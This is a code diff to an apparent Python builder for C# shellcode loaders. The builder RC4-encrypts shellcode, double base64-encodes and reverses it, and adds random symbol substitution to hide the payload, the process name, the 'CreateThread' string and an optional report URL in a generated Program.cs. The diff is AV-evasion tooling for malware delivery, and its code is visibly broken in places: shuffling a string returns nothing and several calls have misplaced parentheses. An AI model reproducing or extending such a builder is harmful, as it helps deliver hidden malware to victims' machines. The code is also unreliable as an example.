@@ -82,6 +82,14 @@ class Helper:
     def delete_folder(path):
         shutil.rmtree(path)
         Helper.create_folder(path)
+	
+    @staticmethod
+    def gen_pattern(charset):	
+        return random.shuffle(charset)
+
+    @staticmethod
+    def replace_data(data, pattern, letter, pattern2, letter2):
+	return data.replace(letter, pattern).replace(letter2, pattern2)
     
 class Config:
         
@@ -106,6 +114,8 @@ class Config:
         if self.key_exists(key):
             return self.configs[key]
         return ""
+
+  
     
     
 class Generator:
@@ -151,7 +161,10 @@ if __name__ == "__main__":
     rc4 = RC4()
     gen = Generator()
     key = gen.gen_rc4_key(32)
-    cipher = base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1])
+    pattern1 = Helper.gen_pattern("#!@$%?&")
+    pattern2 = Helper.gen_pattern(",.<>)(*[]{}")
+
+    cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1]), pattern1, "A", pattern2, "B")
     
     template_path = "template/Program.cs"
     if args.report:
@@ -160,11 +173,13 @@ if __name__ == "__main__":
     template = gen.set_template(template_path).get_output()
     template = template.replace("[KEY]", gen.format_rc4_key(key)) \
     .replace("[PAYLOAD]", cipher) \
-    .replace("[PROCESS_NAME]", base64.b64encode(rc4.Encrypt(config.get("process_name"), key))) \
-    .replace("[CREATE_THREAD]", base64.b64encode(rc4.Encrypt("CreateThread", key))) \
+    .replace("[PROCESS_NAME]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("process_name"), key))), pattern1, "A", pattern2, "B") \
+    .replace("[CREATE_THREAD]", Helper.replace_data(base64.b64encode(rc4.Encrypt("CreateThread", key))), pattern1, "A", pattern2, "B") \
+    .replace("[PATTERN_1]", pattern1) \
+    .replace("[PATTERN_2]", pattern2)
     
     if args.report:
-        template = template.replace("[URL_REPORT]", base64.b64encode(rc4.Encrypt(config.get("url_report"), key)))
+        template = template.replace("[URL_REPORT]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("url_report"), key))), pattern1, "A", pattern2, "B")
 	
     Helper.save_file("%s/Program.cs" % out_dir, template)
     
